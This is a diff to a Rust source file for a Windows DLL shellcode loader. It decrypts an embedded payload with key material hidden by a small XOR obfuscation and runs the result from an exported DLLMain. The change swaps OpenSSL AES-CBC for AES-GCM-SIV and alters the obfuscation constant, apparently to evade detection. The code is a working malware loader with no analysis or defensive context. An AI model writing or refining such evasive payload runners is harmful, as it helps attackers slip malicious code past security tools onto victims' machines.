@@ -1,14 +1,17 @@
+use std::error::Error;
 use std::ptr;
 use std::slice;
 use std::ffi::c_void;
+use aes_gcm_siv::{Aes256GcmSiv, Key, KeyInit, Nonce};
+use aes_gcm_siv::aead::Aead;
 use windows::Win32::System::Memory;
 use windows::Win32::Foundation;
-use windows::Win32::Foundation::WIN32_ERROR;
+use windows::Win32::Foundation::{WAIT_EVENT, WIN32_ERROR};
 use windows::Win32::System::Threading;
 
 // mod crate::data_tmp;
 #[path = "data_tmp.rs"] mod data_tmp;
-use openssl::symm::{decrypt, Cipher};
+// use openssl::symm::{decrypt, Cipher};
 
 pub struct DistributeMemory {
 	len: usize,
@@ -18,7 +21,7 @@ pub struct DistributeMemory {
 impl Drop for DistributeMemory {
 	fn drop(&mut self) {
 		unsafe{
-			Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
+			let _ = Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE);
 		}
 	}
 }
@@ -66,7 +69,7 @@ pub struct Thread {
 
 impl Drop for Thread {
 	fn drop(&mut self) {
-		unsafe { Foundation::CloseHandle(self.handle) };
+		unsafe { let _ = Foundation::CloseHandle(self.handle); };
 	}
 }
 
@@ -118,12 +121,26 @@ impl Thread {
 	
 	pub fn wait(&self) -> Result<(), WIN32_ERROR> {
 		let status = unsafe { Threading::WaitForSingleObject(self.handle, Threading::INFINITE) };
-		if status == WIN32_ERROR(0) {
+		if status == WAIT_EVENT(0) {
 			Ok(())
 		} else {
 			Err( unsafe{Foundation::GetLastError()} )
 		}
 	}
+}
+
+
+/// aes-gcm-siv 解密
+/// data - [u8]
+/// key - [u8;32]
+/// nonce - [u8;12]
+fn aes_gcm_siv_dec(data: &[u8], key: &[u8], nonce: &[u8]) -> Result<Vec<u8>,Box<dyn Error>> {
+	let key: &Key<Aes256GcmSiv> = key.into();
+	let cipher = Aes256GcmSiv::new(&key);
+	let nonce = Nonce::from_slice(nonce);
+
+	let plaintext = cipher.decrypt(nonce, data).unwrap();
+	Ok(plaintext)
 }
 
 pub fn run(shellcode: Vec<u8>) -> Result<(), WIN32_ERROR> {
@@ -141,10 +158,10 @@ pub extern fn DLLMain() {
 	let (d1, d2, d3, d4) = data_tmp::getdata();
 
     // 简单混淆
-    let newiv: [u8; 16] = d3
+    let newnonce: [u8; 12] = d3
         .into_iter()
         .zip(d2.clone())
-        .map(|(a, b)| a ^ b ^ 5 << 3)
+        .map(|(a, b)| a ^ b ^ 5 << 1)
         .collect::<Vec<u8>>()
         .as_slice()
         .try_into()
@@ -158,8 +175,9 @@ pub extern fn DLLMain() {
         .try_into()
         .unwrap();
 
-    let cipher = Cipher::aes_256_cbc();
-    let plaintext = decrypt(cipher, &newkey, Some(&newiv), d1.as_slice()).unwrap();
+    // let cipher = Cipher::aes_256_cbc();
+    // let plaintext = decrypt(cipher, &newkey, Some(&newiv), d1.as_slice()).unwrap();
+	let plaintext = aes_gcm_siv_dec(d1.as_slice(),&newkey,&newnonce).unwrap();
 
-    run(plaintext);
+    let _ = run(plaintext);
 }
